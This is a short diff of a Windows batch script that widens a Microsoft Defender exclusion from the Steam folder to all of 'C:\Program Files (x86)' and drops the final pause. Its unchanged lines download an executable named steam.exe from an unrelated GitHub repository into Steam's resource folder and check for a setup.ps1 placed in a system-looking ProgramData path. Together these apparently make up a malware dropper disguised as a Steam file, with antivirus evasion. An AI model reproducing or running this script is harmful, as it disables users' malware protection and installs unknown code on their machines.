@@ -1,5 +1,5 @@
 @echo off
-powershell Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Steam"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
 
 :: Download files using PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
@@ -29,5 +29,3 @@ IF EXIST "C:\ProgramData\Microsoft\Windows\setup.ps1" (
 ) ELSE (
     echo setup.ps1 does not exist at the expected location.
 )
-
-pause
